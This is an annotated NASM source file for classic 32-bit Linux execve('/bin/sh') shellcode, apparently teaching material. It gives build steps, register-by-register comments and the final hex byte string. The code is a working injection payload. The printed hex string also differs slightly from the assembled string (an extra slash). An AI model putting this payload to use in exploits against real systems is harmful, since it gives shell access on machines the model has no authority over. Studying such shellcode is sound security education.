;shellcode.asm
;	nasm -f elf shellcode.s
;	ld -m elf_i386 -o shellcode shellcode.o  (-m elf-i386 if building on 64-bit host)
;	objdump -d shellcode
;       Then enter the hex bytes as a string. 
;       Note that objdump will disassemble "/binshNAAAABBBB". 
; 2014: original version, based on http://www.vividmachines.com/shellcode/shellcode.html, by Steve Hanna
; 2019: corrected shellcode (ecx/edx had been zeroed out unnecessarily)

[SECTION .text]

global _start

; In the string "/bin/shNAAAABBBB", N is replaced by a null byte, AAAA is replaced
; by the address of this string, and BBBB is replaced by 32-bit zero.
; In order to call execve:
; eax/al contains the interrupt parameter, 11 (for 32-bit linux)
; ebx contains the address of the null-terminated string "/bin/sh"
; ecx contains the address of a pointer to the args: ["/bin/sh", 0], that is, to AAAA
; edx contains the address of a pointer to the environment, that is, to BBBB [here 0]
; The BBBB does double duty as the NULL terminating the list pointed to by ecx, 
; and as the NULL pointed to by edx.

_start:
        jmp short shellstring
        start:
        pop ebx                 ;get the address of the string in ebx
        sub eax, eax            ;zero eax by subtracting it from itself
        mov [ebx+7 ], al        ;put a NUL byte where the N is in the string
        mov [ebx+8 ], ebx       ;put the address of the string where the AAAA is
        mov [ebx+12], eax       ;put 4 null bytes into where the BBBB is
        mov al, 11              ;execve is syscall 11
        lea ecx, [ebx+8]        ;load the address of where the AAAA was
        lea edx, [ebx+12]       ;load the address of the NULLS;        
        int 0x80                ;call the kernel, WE HAVE A SHELL!
        shellstring:
        call start
        db '/bin/shNAAAABBBB'
;
; Here is the shellcode:
;
;	"\xeb\x16\x5b\x29\xc0\x88\x43\x07\x89\x5b\x08\x89"
;	"\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80"
;	"\xe8\xe5\xff\xff\xff/bin/sh/NAAAABBBB"

